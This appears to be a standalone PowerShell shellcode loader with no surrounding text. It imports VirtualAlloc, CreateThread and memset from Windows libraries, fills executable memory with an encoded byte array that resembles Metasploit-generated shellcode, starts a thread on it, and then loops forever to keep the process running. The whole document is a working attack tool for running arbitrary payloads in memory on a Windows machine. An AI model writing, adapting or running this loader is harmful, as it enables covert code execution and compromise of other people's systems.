
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd8,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xbf,0xed,0x98,0x45,0x64,0xb1,0x47,0x31,0x7b,0x18,0x03,0x7b,0x18,0x83,0xc3,0xe9,0x7a,0xb0,0x98,0x19,0xf8,0x3b,0x61,0xd9,0x9d,0xb2,0x84,0xe8,0x9d,0xa1,0xcd,0x5a,0x2e,0xa1,0x80,0x56,0xc5,0xe7,0x30,0xed,0xab,0x2f,0x36,0x46,0x01,0x16,0x79,0x57,0x3a,0x6a,0x18,0xdb,0x41,0xbf,0xfa,0xe2,0x89,0xb2,0xfb,0x23,0xf7,0x3f,0xa9,0xfc,0x73,0xed,0x5e,0x89,0xce,0x2e,0xd4,0xc1,0xdf,0x36,0x09,0x91,0xde,0x17,0x9c,0xaa,0xb8,0xb7,0x1e,0x7f,0xb1,0xf1,0x38,0x9c,0xfc,0x48,0xb2,0x56,0x8a,0x4a,0x12,0xa7,0x73,0xe0,0x5b,0x08,0x86,0xf8,0x9c,0xae,0x79,0x8f,0xd4,0xcd,0x04,0x88,0x22,0xac,0xd2,0x1d,0xb1,0x16,0x90,0x86,0x1d,0xa7,0x75,0x50,0xd5,0xab,0x32,0x16,0xb1,0xaf,0xc5,0xfb,0xc9,0xcb,0x4e,0xfa,0x1d,0x5a,0x14,0xd9,0xb9,0x07,0xce,0x40,0x9b,0xed,0xa1,0x7d,0xfb,0x4e,0x1d,0xd8,0x77,0x62,0x4a,0x51,0xda,0xea,0xbf,0x58,0xe5,0xea,0xd7,0xeb,0x96,0xd8,0x78,0x40,0x31,0x50,0xf0,0x4e,0xc6,0x97,0x2b,0x36,0x58,0x66,0xd4,0x47,0x70,0xac,0x80,0x17,0xea,0x05,0xa9,0xf3,0xea,0xaa,0x7c,0x69,0xee,0x3c,0xbf,0xc6,0xf1,0x8b,0x57,0x15,0xf2,0x8d,0xf7,0x90,0x14,0x21,0xa8,0xf2,0x88,0x81,0x18,0xb3,0x78,0x69,0x73,0x3c,0xa6,0x89,0x7c,0x96,0xcf,0x23,0x93,0x4f,0xa7,0xdb,0x0a,0xca,0x33,0x7a,0xd2,0xc0,0x39,0xbc,0x58,0xe7,0xbe,0x72,0xa9,0x82,0xac,0xe2,0x59,0xd9,0x8f,0xa4,0x66,0xf7,0xba,0x48,0xf3,0xfc,0x6c,0x1f,0x6b,0xff,0x49,0x57,0x34,0x00,0xbc,0xec,0xfd,0x94,0x7f,0x9a,0x01,0x79,0x80,0x5a,0x54,0x13,0x80,0x32,0x00,0x47,0xd3,0x27,0x4f,0x52,0x47,0xf4,0xda,0x5d,0x3e,0xa9,0x4d,0x36,0xbc,0x94,0xba,0x99,0x3f,0xf3,0x3a,0xe5,0xe9,0x3d,0x49,0x07,0x2a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

